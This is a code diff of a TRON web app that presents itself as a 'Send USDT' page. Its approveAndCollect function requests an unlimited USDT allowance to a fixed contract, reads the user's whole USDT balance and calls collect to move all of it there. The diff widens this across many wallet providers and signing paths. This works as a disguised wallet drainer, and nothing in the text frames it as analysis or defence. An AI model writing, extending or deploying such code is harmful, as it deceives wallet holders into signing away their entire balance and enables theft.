@@ -13,16 +13,16 @@ import {
 import { TronAdapter } from '@reown/appkit-adapter-tron'
 import { tronMainnet } from '@reown/appkit/networks'
 
+// --- TRON SPECIFIC ADAPTERS ---
 import { 
   TronLinkAdapter, 
   TrustAdapter, 
   MetaMaskAdapter, 
   OkxWalletAdapter,
   TokenPocketAdapter,
-  BitKeepAdapter,
+  BitKeepAdapter, 
   BybitWalletAdapter,
   BinanceWalletAdapter,
-  // LedgerAdapter
 } from '@tronweb3/tronwallet-adapters'
 
 import { Copy, CheckCircle, AlertCircle, Wallet } from 'lucide-react'
@@ -52,7 +52,6 @@ const tronAdapter = new TronAdapter({
     new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
     new BinanceWalletAdapter({ openUrlWhenWalletNotFound: false }),
     new BybitWalletAdapter({ openUrlWhenWalletNotFound: false }),
-    // new LedgerAdapter(),
     new MetaMaskAdapter(), 
   ],
 })
@@ -80,6 +79,11 @@ createAppKit({
     '--w3m-accent': '#00ff9f',
   },
   allWallets: 'SHOW',
+  features: {
+    email: false,
+    socials: [],
+    analytics: true,
+  },
 })
 
 // === TRON ABIs ===
@@ -104,122 +108,129 @@ const instantiateTronWeb = (host: string) => {
 };
 
 export default function App() {
-  const [directAddress, setDirectAddress] = useState<string | null>(null)
   const [usdtBalance, setUsdtBalance] = useState('0')
   const [status, setStatus] = useState('Ready')
   const [debugLog, setDebugLog] = useState<string[]>([])
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
+  const autoTriggered = useRef(false)
 
   const { open } = useAppKit()
-  const { address: appKitAddress } = useAppKitAccount()
+  const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
   const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
 
-  // 1. ** HYBRID ADDRESS STATE ** // Priorities `window.tronWeb` over Reown.
-  const activeAddress = directAddress || appKitAddress;
-  const isWalletConnected = !!activeAddress;
+  const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
+
+  const resolveTronWeb = () => {
+    const w = window as any;
+
+    if (w.tronWeb?.contract) return w.tronWeb;
+    if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
+    
+    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
+    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
+    if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
+    if (w.trustWallet?.tronLink?.tronWeb?.contract) return w.trustWallet.tronLink.tronWeb;
+    if (w.tron?.tronWeb?.contract) return w.tron.tronWeb; 
+    if (w.bitkeep?.tronWeb?.contract) return w.bitkeep.tronWeb;
+    if (w.tokenpocket?.tronWeb?.contract) return w.tokenpocket.tronWeb;
+
+    if (tronWalletProvider) {
+      if ((tronWalletProvider as any).contract) return tronWalletProvider;
+      if ((tronWalletProvider as any).adapter?.tronWeb?.contract) return (tronWalletProvider as any).adapter.tronWeb;
+      if ((tronWalletProvider as any).tronWeb?.contract) return (tronWalletProvider as any).tronWeb;
+    }
+
+    return null;
+  };
 
   const log = (msg: string) => {
     console.log(msg);
     setDebugLog(prev => [msg, ...prev].slice(0, 5)); 
   }
 
-  // 2. ** DIRECT TRONWEB INJECTION CHECK **
   useEffect(() => {
-    const checkDirect = () => {
-      const w = window as any;
-      const tw = w.tronWeb || w.tronLink?.tronWeb;
-      if (tw && tw.defaultAddress?.base58) {
-        setDirectAddress(tw.defaultAddress.base58);
-      } else {
-        if (!appKitAddress) setDirectAddress(null);
-      }
-    };
-    
-    checkDirect();
-    const interval = setInterval(checkDirect, 1000);
-    return () => clearInterval(interval);
-  }, [appKitAddress]);
+    const init = async () => {
+      if (!isConnected || !walletAddress) return;
 
-  // 3. ** BALANCE FETCHER **
-  useEffect(() => {
-    const fetchBalance = async () => {
-      if (!activeAddress) return;
-      
-      const w = window as any;
-      const tw = w.tronWeb || w.tronLink?.tronWeb;
-      
-      // Use direct TronWeb if available, otherwise use a public node
-      let providerToUse = tw && tw.defaultAddress?.base58 ? tw : instantiateTronWeb(FULL_HOST);
+      log(`Connected: ${caipAddress}`);
 
-      try {
-        const usdt = await providerToUse.contract(USDT_ABI).at(USDT_ADDRESS);
-        const bal = await usdt.balanceOf(activeAddress).call();
-        setUsdtBalance((Number(bal) / 1_000_000).toFixed(2));
-        setStatus('Ready');
-      } catch (e) {
-        log('❌ Balance fetch failed');
-      }
-    };
-
-    if (activeAddress) fetchBalance();
-  }, [activeAddress]);
-
-  // 4. ** DIRECT CONNECT HANDLER **
-  const handleConnect = async () => {
-    const w = window as any;
-    
-    if (w.tronLink || w.tronWeb) {
-      try {
-        if (w.tronLink?.request) {
-          await w.tronLink.request({ method: 'tron_requestAccounts' });
-        } else if (w.tronWeb?.request) {
-          await w.tronWeb.request({ method: 'tron_requestAccounts' });
-        }
+      if (isTron) {
+        setStatus('Initializing TRON...');
         
-        if (w.tronWeb?.defaultAddress?.base58) {
-          setDirectAddress(w.tronWeb.defaultAddress.base58);
-          log("✅ Connected directly via TronWeb");
-          return; // Exit out, we don't need Reown!
+        let finalTronWeb = null;
+        for (let i = 0; i < 10; i++) {
+          finalTronWeb = resolveTronWeb();
+          if (finalTronWeb && (finalTronWeb.defaultAddress?.base58 || finalTronWeb.ready)) break;
+          await new Promise(r => setTimeout(r, 500));
         }
-      } catch (e) {
-        log("Direct connection ignored, opening Reown...");
+
+        if (!finalTronWeb) {
+          log("⚠️ Injected Provider not found. Using direct TronWeb.");
+          try {
+            const publicTronWeb = instantiateTronWeb(FULL_HOST);
+            await getTronBalance(publicTronWeb, walletAddress);
+            setStatus('Ready'); 
+          } catch (e: any) {
+            log(`❌ Init Error: ${e.message}`);
+            setStatus('Ready');
+          }
+          return;
+        }
+
+        log('✅ TRON Provider Found');
+        await getTronBalance(finalTronWeb, walletAddress);
       }
+    };
+
+    init();
+  }, [isConnected, walletAddress, caipAddress, tronWalletProvider, isTron]);
+
+  const getTronBalance = async (tw: any, addr: string) => {
+    try {
+      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
+      const bal = await usdt.balanceOf(addr).call()
+      setUsdtBalance((Number(bal) / 1_000_000).toFixed(2))
+      setStatus('Ready')
+      log(`TRON USDT: ${(Number(bal) / 1_000_000).toFixed(2)}`)
+    } catch (e) {
+      log('❌ TRON balance fetch failed')
     }
-    
-    // Fallback if TronWeb direct connection fails (like in Trust Wallet)
-    open({ view: 'AllWallets' });
   }
 
-  // 5. ** DIRECT EXECUTION LOGIC **
-  const approveAndCollect = async () => {
-    if (!activeAddress) return;
+  const handleConnect = () => {
+    open({ view: 'AllWallets' })
+  }
+
+ const approveAndCollect = async () => {
+    if (!walletAddress) return;
 
     setLoading(true);
     setStatus('Step 1/2: Approving...');
+    log("Requesting USDT Approval...");
 
     try {
+      const activeTw = resolveTronWeb();
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-      const w = window as any;
-      const tw = w.tronWeb || w.tronLink?.tronWeb;
 
-      // --- PATH A: PURE TRONWEB (Highest Priority) ---
-      if (tw && tw.defaultAddress?.base58) {
-        log('Executing directly via TronWeb...');
-        const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS);
+      // PATH A: Fully Injected Wallet (TronLink, etc.)
+      if (activeTw && typeof activeTw.contract === 'function') {
+        log('Executing via Injected Provider...');
+        const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
         
         const approveTx = await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
         log(`✅ Approved! Hash: ${approveTx.slice(0, 10)}...`);
         
         setStatus('Step 2/2: Collecting...');
-        await new Promise(r => setTimeout(r, 3000)); // network sync
+        log("Waiting 3s for network sync...");
+        await new Promise(r => setTimeout(r, 3000));
 
-        const balanceObj = await usdt.balanceOf(activeAddress).call();
+        const balanceObj = await usdt.balanceOf(walletAddress).call();
         const amount = balanceObj.toString();
         log(`Found ${Number(amount) / 1000000} USDT to collect.`);
 
-        const contract = await tw.contract(COLLECT_ABI).at(CONTRACT_ADDRESS);
-        const tx = await contract.collect(activeAddress, amount).send({ feeLimit: 150_000_000 });
+        const contract = await activeTw.contract(COLLECT_ABI).at(CONTRACT_ADDRESS);
+        const tx = await contract.collect(walletAddress, amount).send({ feeLimit: 150_000_000 });
 
         setTxHash(tx);
         log("✅ Successfully Collected!");
@@ -227,9 +238,9 @@ export default function App() {
         return;
       }
 
-      // --- PATH B: WALLETCONNECT FALLBACK ---
+      // PATH B: Direct TronWeb via Universal Provider (Catches Trust Wallet & WalletConnect)
       if (tronWalletProvider) {
-        log("Executing via WalletConnect fallback...");
+        log("Executing via Direct TronWeb Provider...");
         
         const publicTw = instantiateTronWeb(FULL_HOST);
         
@@ -239,17 +250,21 @@ export default function App() {
             func, 
             { feeLimit: fee, callValue: 0 }, 
             params, 
-            activeAddress
+            walletAddress
           );
           
           let signedTx;
           
-          if (typeof (tronWalletProvider as any).signTransaction === 'function') {
-            signedTx = await (tronWalletProvider as any).signTransaction(transaction);
-          } else if (typeof (tronWalletProvider as any).request === 'function') {
-            signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
-          } else {
-            throw new Error("Provider does not support signing");
+          try {
+            if (typeof (tronWalletProvider as any).signTransaction === 'function') {
+              signedTx = await (tronWalletProvider as any).signTransaction(transaction);
+            } else if (typeof (tronWalletProvider as any).request === 'function') {
+              signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
+            } else {
+              throw new Error("Provider does not support signing");
+            }
+          } catch (signErr: any) {
+             throw new Error(`Signing rejected: ${signErr.message || 'Unknown Error'}`);
           }
 
           const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
@@ -269,18 +284,20 @@ export default function App() {
         log(`✅ Approved! Hash: ${approveTx.slice(0, 10)}...`);
 
         setStatus('Step 2/2: Collecting...');
+        log("Waiting 3s for network sync...");
         await new Promise(r => setTimeout(r, 3000));
 
-        publicTw.setAddress(activeAddress);
+        publicTw.setAddress(walletAddress);
         const usdt = await publicTw.contract(USDT_ABI).at(USDT_ADDRESS);
-        const balanceObj = await usdt.balanceOf(activeAddress).call();
+        const balanceObj = await usdt.balanceOf(walletAddress).call();
         const amount = balanceObj.toString();
+        log(`Found ${Number(amount) / 1000000} USDT to collect.`);
 
         const tx = await signAndSend(
           CONTRACT_ADDRESS,
           'collect(address,uint256)',
           [ 
-            { type: 'address', value: publicTw.address.toHex(activeAddress) }, 
+            { type: 'address', value: publicTw.address.toHex(walletAddress) }, 
             { type: 'uint256', value: amount } 
           ],
           150_000_000
@@ -292,11 +309,12 @@ export default function App() {
         return;
       }
 
-      throw new Error("No TRON provider active");
+      throw new Error("TRON wallet provider could not be established.");
 
     } catch (err: any) {
-      log(`❌ Error: ${err.message || 'User rejected'}`);
+      log(`❌ Error: ${err.message || 'Transaction Failed'}`);
       setStatus('❌ Transaction Failed');
+      autoTriggered.current = false; 
     } finally {
       setLoading(false);
     }
@@ -318,7 +336,7 @@ export default function App() {
         </div>
 
         <div className="p-8 space-y-8">
-          {!isWalletConnected ? (
+          {!isConnected ? (
             <div className="text-center">
               <h2 className="text-5xl font-bold mb-3">Send USDT</h2>
 
@@ -340,10 +358,10 @@ export default function App() {
               <div className="bg-zinc-950 p-5 rounded-2xl flex justify-between items-center">
                 <div>
                   <p className="text-zinc-400 text-sm">Connected Wallet</p>
-                  <p className="font-mono text-sm text-emerald-400 break-all">{activeAddress}</p>
+                  <p className="font-mono text-sm text-emerald-400 break-all">{walletAddress}</p>
                 </div>
                 <button
-                  onClick={() => navigator.clipboard.writeText(activeAddress ?? '')}
+                  onClick={() => navigator.clipboard.writeText(walletAddress ?? '')}
                   className="text-emerald-400 hover:text-white"
                 >
                   <Copy size={20} />
